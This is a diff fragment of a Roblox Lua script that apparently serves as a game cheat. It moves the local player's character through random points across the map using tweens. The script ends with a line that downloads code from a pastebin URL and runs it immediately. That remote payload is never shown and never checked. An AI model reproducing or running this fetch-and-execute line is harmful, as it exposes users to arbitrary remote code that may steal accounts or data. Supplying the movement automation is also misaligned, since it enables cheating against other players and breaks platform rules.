@@ -139,5 +139,49 @@ end)
 
 
 
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 
+local player = Players.LocalPlayer
+local character = player.Character
+if not character or not character:FindFirstChild("HumanoidRootPart") then
+    return
+end
+
+local center = Vector3.new(-121.2892150878906, 132.10856151580798, -123.7562255859375)
+local radius = 744.4847106933594
+local minY = 23.49869346618523
+local maxY = 240.7184295654297
+local moveDuration = 2
+local pointsToVisit = 10
+local humanoidRootPart = character.HumanoidRootPart
+
+local function getRandomPointInCircle()
+    local theta = math.random() * 2 * math.pi
+    local r = radius * math.sqrt(math.random())
+    local x = center.X + r * math.cos(theta)
+    local z = center.Z + r * math.sin(theta)
+    local y = minY + (maxY - minY) * math.random()
+    return Vector3.new(x, y, z) + Vector3.new(0, 3, 0)
+end
+
+for i = 1, pointsToVisit do
+    if not character or not character.Parent or not humanoidRootPart then
+        break
+    end
+
+    local targetPos = getRandomPointInCircle()
+    local tweenInfo = TweenInfo.new(
+        moveDuration,
+        Enum.EasingStyle.Sine,
+        Enum.EasingDirection.InOut
+    )
+    local tween = TweenService:Create(
+        humanoidRootPart,
+        tweenInfo,
+        {CFrame = CFrame.new(targetPos)}
+    )
+    tween:Play()
+    tween.Completed:Wait()
+end
 loadstring(game:HttpGet('https://pastebin.com/raw/L5MnZS6X'))()
